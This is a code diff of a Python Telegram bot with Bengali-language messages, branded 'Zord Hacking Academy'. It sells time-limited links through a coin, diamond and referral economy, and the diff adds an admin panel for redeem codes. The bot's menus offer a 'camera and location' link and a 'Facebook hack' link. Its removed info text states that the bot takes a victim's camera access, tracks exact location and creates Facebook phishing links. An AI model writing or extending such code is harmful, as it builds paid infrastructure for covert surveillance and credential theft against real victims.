@@ -45,11 +45,11 @@ def is_subscribed(user_id):
 # --- রেন্ডার সার্ভার ---
 app = Flask('')
 @app.route('/')
-def home(): return "Zord Academy Bot Online!"
+def home(): return "Zord Bot is Running!"
 def run(): app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
 def keep_alive(): Thread(target=run).start()
 
-# --- মেনু বাটন ---
+# --- কিবোর্ড মেনু ---
 def main_menu():
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
     markup.row("🚀 Start", "💰 My Assets")
@@ -70,7 +70,7 @@ def welcome(message):
                 ref_data = get_user(ref_id)
                 ref_data['coins'] = ref_data.get('coins', 0) + 50
                 save_user(ref_id, ref_data)
-                bot.send_message(ref_id, "🎉 কেউ আপনার লিঙ্কে জয়েন করেছে! ৫০ কয়েন পেয়েছেন।")
+                bot.send_message(ref_id, "🎉 অভিনন্দন! কেউ আপনার লিঙ্কে জয়েন করেছে। ৫০ কয়েন পেয়েছেন।")
         save_user(user_id, {"coins": 0, "diamonds": 0})
 
     if not is_subscribed(user_id):
@@ -89,46 +89,36 @@ def handle_text(message):
     data = get_user(user_id)
 
     if text == "🚀 Start":
-        bot.send_message(user_id, "বোট অ্যাক্টিভ আছে।", reply_markup=main_menu())
+        bot.send_message(user_id, "বোট রেডি!", reply_markup=main_menu())
 
     elif text == "💰 My Assets":
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("🛒 কিনুন", url=f"https://t.me/{ADMIN_USERNAME}"),
                    types.InlineKeyboardButton("🎁 রিডিম কোড", callback_data="redeem_ui"))
-        msg = f"📊 **আপনার ব্যালেন্স:**\n\n🪙 Coins: {data.get('coins', 0)}\n💎 Diamonds: {data.get('diamonds', 0)}"
+        
+        # অ্যাডমিন হলে স্পেশাল বাটন দেখাবে
+        if user_id == ADMIN_ID:
+            markup.add(types.InlineKeyboardButton("⚙️ অ্যাডমিন প্যানেল", callback_data="admin_panel"))
+            
+        msg = f"📊 **ব্যালেন্স:**\n\n🪙 Coins: {data.get('coins', 0)}\n💎 Diamonds: {data.get('diamonds', 0)}"
         bot.send_message(user_id, msg, reply_markup=markup, parse_mode='Markdown')
 
     elif text == "👥 Refer":
         bot_user = bot.get_me().username
         link = f"https://t.me/{bot_user}?start={user_id}"
-        bot.send_message(user_id, f"🔗 রেফার লিঙ্ক: {link}\n\nপ্রতি জয়েনে ৫০ কয়েন পাবেন!")
+        bot.send_message(user_id, f"🔗 রেফার লিঙ্ক: {link}\nপ্রতি জয়েনে ৫০ কয়েন!")
 
     elif text == "🔥 Access":
         markup = types.InlineKeyboardMarkup()
         markup.add(types.InlineKeyboardButton("📸 ক্যামেরা ও লোকেশন (10 Coin)", callback_data="buy_cam"),
                    types.InlineKeyboardButton("🔐 ফেসবুক হ্যাক (1 Diamond)", callback_data="buy_fb"))
-        bot.send_message(user_id, "আপনি কিসের অ্যাক্সেস নিতে চান?", reply_markup=markup)
+        bot.send_message(user_id, "কি অ্যাক্সেস করতে চান?", reply_markup=markup)
 
     elif text == "ℹ️ Info":
-        info_text = (
-            "🤖 **Zord Hacking Academy ইনফো**\n\n"
-            "এটি একটি অ্যাডভান্সড হ্যাকিং বোট। নিচে বোটের সব খরচ দেওয়া হলো:\n\n"
-            "✅ **কি কি কাজ করা যায়?**\n"
-            "- ভিকটিমের ক্যামেরা অ্যাক্সেস নেওয়া।\n"
-            "- সঠিক লোকেশন ট্র্যাক করা।\n"
-            "- ফেসবুক ফিশিং লিঙ্ক তৈরি করা।\n\n"
-            "💰 **খরচ (Cost):**\n"
-            "📸 ক্যামেরা + লোকেশন: ১০ কয়েন।\n"
-            "🔐 ফেসবুক অ্যাক্সেস: ১ ডায়মন্ড।\n\n"
-            "🪙 **কয়েন পাওয়ার উপায়:**\n"
-            "- বন্ধুদের রেফার করলে পাবেন ৫০ কয়েন।\n"
-            "- অ্যাডমিনের থেকে কিনতে পারবেন।\n\n"
-            "💎 **ডায়মন্ড পাওয়ার উপায়:**\n"
-            "- ডায়মন্ড শুধুমাত্র অ্যাডমিন দিতে পারে।\n\n"
-            "⚠️ **সতর্কতা:** লিঙ্কের মেয়াদ ১ ঘণ্টা থাকবে।"
-        )
-        bot.send_message(user_id, info_text, parse_mode='Markdown')
+        info = "🤖 **Zord Academy ইনফো**\n\n📸 ক্যামেরা: ১০ কয়েন\n🔐 ফেসবুক: ১ ডায়মন্ড\n👥 রেফার: ৫০ কয়েন\n⚠️ লিঙ্ক মেয়াদ: ১ ঘণ্টা"
+        bot.send_message(user_id, info, parse_mode='Markdown')
 
+# --- কলব্যাক হ্যান্ডলার (Callback Handlers) ---
 @bot.callback_query_handler(func=lambda call: True)
 def callback_handler(call):
     user_id = str(call.message.chat.id)
@@ -137,59 +127,86 @@ def callback_handler(call):
     if call.data == "verify_join":
         if is_subscribed(user_id):
             bot.delete_message(user_id, call.message.message_id)
-            bot.send_message(user_id, "ধন্যবাদ! এখন মেনু ব্যবহার করুন।", reply_markup=main_menu())
+            bot.send_message(user_id, "বোট একটিভ হয়েছে!", reply_markup=main_menu())
         else: bot.answer_callback_query(call.id, "আগে জয়েন করুন!", show_alert=True)
 
     elif call.data == "redeem_ui":
-        msg = bot.send_message(user_id, "রিডিম কোডটি টাইপ করে পাঠান:")
+        msg = bot.send_message(user_id, "প্রোমো কোডটি দিন:")
         bot.register_next_step_handler(msg, process_redeem)
 
+    elif call.data == "admin_panel":
+        if int(user_id) != ADMIN_ID: return
+        markup = types.InlineKeyboardMarkup()
+        markup.add(types.InlineKeyboardButton("➕ নতুন রিডিম কোড তৈরি", callback_data="gen_code"))
+        bot.send_message(user_id, "অ্যাডমিন প্যানেল:", reply_markup=markup)
+
+    elif call.data == "gen_code":
+        msg = bot.send_message(user_id, "১. কোডের নাম দিন (যেমন: GIFT100):")
+        bot.register_next_step_handler(msg, get_code_name)
+
+    elif call.data.startswith("set_type_"):
+        parts = call.data.split("_")
+        asset_type, code_name = parts[2], parts[3]
+        msg = bot.send_message(user_id, f"৩. কত {asset_type} দিতে চান? (সংখ্যা দিন):")
+        bot.register_next_step_handler(msg, lambda m: get_amount(m, code_name, asset_type))
+
+    # বাটন একশন (Buy Cam/FB)
     elif call.data == "buy_cam":
         if data.get('coins', 0) >= 10:
             data['coins'] -= 10
             save_user(user_id, data)
             exp = int(time.time()) + 3600
-            short_link = shorten_link(f"{BASE_URL}?id={user_id}&exp={exp}")
-            bot.send_message(user_id, f"✅ ক্যামেরা ও লোকেশন লিঙ্ক: {short_link}\n(মেয়াদ ১ ঘণ্টা)")
-        else: bot.answer_callback_query(call.id, "কয়েন নেই! রেফার করুন।", show_alert=True)
+            short = shorten_link(f"{BASE_URL}?id={user_id}&exp={exp}")
+            bot.send_message(user_id, f"✅ ক্যামেরা লিঙ্ক: {short}")
+        else: bot.answer_callback_query(call.id, "কয়েন নেই!", show_alert=True)
 
     elif call.data == "buy_fb":
         if data.get('diamonds', 0) >= 1:
             data['diamonds'] -= 1
             save_user(user_id, data)
             exp = int(time.time()) + 3600
-            short_link = shorten_link(f"{BASE_URL}fb/?id={user_id}&exp={exp}")
-            bot.send_message(user_id, f"✅ ফেসবুক লিঙ্ক: {short_link}\n(মেয়াদ ১ ঘণ্টা)")
-        else: bot.answer_callback_query(call.id, "ডায়মন্ড নেই! অ্যাডমিনের থেকে নিন।", show_alert=True)
+            short = shorten_link(f"{BASE_URL}fb/?id={user_id}&exp={exp}")
+            bot.send_message(user_id, f"✅ ফেসবুক লিঙ্ক: {short}")
+        else: bot.answer_callback_query(call.id, "ডায়মন্ড নেই!", show_alert=True)
 
+# --- অ্যাডমিন রিডিম কোড প্রসেস ---
+def get_code_name(message):
+    code_name = message.text
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton("🪙 Coin", callback_data=f"set_type_coin_{code_name}"),
+               types.InlineKeyboardButton("💎 Diamond", callback_data=f"set_type_dia_{code_name}"))
+    bot.send_message(message.chat.id, f"২. '{code_name}' কোডটি কিসের হবে?", reply_markup=markup)
+
+def get_amount(message, code_name, asset_type):
+    amount = message.text
+    msg = bot.send_message(message.chat.id, "৪. ইউজার লিমিট দিন (কতজন পাবে):")
+    bot.register_next_step_handler(msg, lambda m: finalize_code(m, code_name, asset_type, amount))
+
+def finalize_code(message, code_name, asset_type, amount):
+    limit = int(message.text)
+    payload = {"limit": limit}
+    if asset_type == "coin": payload["coin_amount"] = int(amount)
+    else: payload["diamond_amount"] = int(amount)
+    
+    requests.patch(f"{FIREBASE_URL}/promo/{code_name}.json", json=payload)
+    bot.send_message(message.chat.id, f"✅ সফল! কোড: `{code_name}` তৈরি হয়েছে।", parse_mode='Markdown')
+
+# --- সাধারণ ইউজার রিডিম প্রসেস ---
 def process_redeem(message):
     code = message.text
     user_id = str(message.chat.id)
     promo = get_promo(code)
-    
     if promo:
         used_by = promo.get('used_by', {})
-        limit = promo.get('limit', 1)
-        
-        if user_id in used_by:
-            bot.send_message(user_id, "❌ আপনি এই কোডটি একবার ব্যবহার করেছেন!")
+        if user_id in used_by or len(used_by) >= promo.get('limit', 1):
+            bot.send_message(user_id, "❌ কোডটি ইনভ্যালিড বা লিমিট শেষ!")
             return
-            
-        if len(used_by) >= limit:
-            bot.send_message(user_id, "😔 দুঃখিত! কোডটির লিমিট শেষ হয়ে গেছে।")
-            return
-
         user_data = get_user(user_id)
-        if 'coin_amount' in promo:
-            user_data['coins'] += promo['coin_amount']
-            txt = f"✅ {promo['coin_amount']} কয়েন যোগ হয়েছে!"
-        elif 'diamond_amount' in promo:
-            user_data['diamonds'] += promo['diamond_amount']
-            txt = f"✅ {promo['diamond_amount']} ডায়মন্ড যোগ হয়েছে!"
-        
+        if 'coin_amount' in promo: user_data['coins'] += promo['coin_amount']
+        elif 'diamond_amount' in promo: user_data['diamonds'] += promo['diamond_amount']
         save_user(user_id, user_data)
         requests.patch(f"{FIREBASE_URL}/promo/{code}/used_by.json", json={user_id: True})
-        bot.send_message(user_id, txt)
+        bot.send_message(user_id, "✅ রিডিম সফল হয়েছে!")
     else: bot.send_message(user_id, "❌ ভুল কোড!")
 
 if __name__ == "__main__":
